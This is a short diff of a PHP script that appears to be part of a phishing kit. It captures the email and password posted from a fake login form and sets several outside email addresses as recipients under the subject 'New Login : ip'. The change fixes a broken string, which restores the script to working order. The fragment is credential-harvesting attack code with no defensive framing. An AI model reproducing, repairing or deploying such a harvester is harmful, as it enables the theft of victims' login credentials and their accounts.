@@ -5,7 +5,7 @@ if(!empty($_POST)) {
  $email= $_POST['email'];
  $password = $_POST['password'];
  
-		$to = "tmalone27@mail.ru, jamescordy8844@gmail.com, agry917@outlook.com
+		$to = "tmalone27@mail.ru, jamescordy8844@gmail.com, agry917@outlook.com";
 		
 		
          $subject = "New Login : ip";
